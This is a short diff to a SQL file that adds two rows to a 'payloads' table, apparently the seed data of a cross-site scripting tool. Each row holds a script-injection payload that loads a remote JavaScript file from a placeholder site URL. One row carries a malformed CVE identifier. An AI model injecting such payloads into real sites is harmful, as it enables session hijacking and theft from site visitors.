@@ -26,3 +26,5 @@ CREATE TABLE `payloads` (
   `payload` text,
   PRIMARY KEY (`id`)
 ) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=latin1;
+
+INSERT INTO `payloads` VALUES (1,'#2 Apache Header Length (CVE-201200053)','<script src=\'{siteURL}y.js\'></script>'),(2,'#1 Default AJAX Attack','<script src=\'{siteURL}x.js\'></script>');
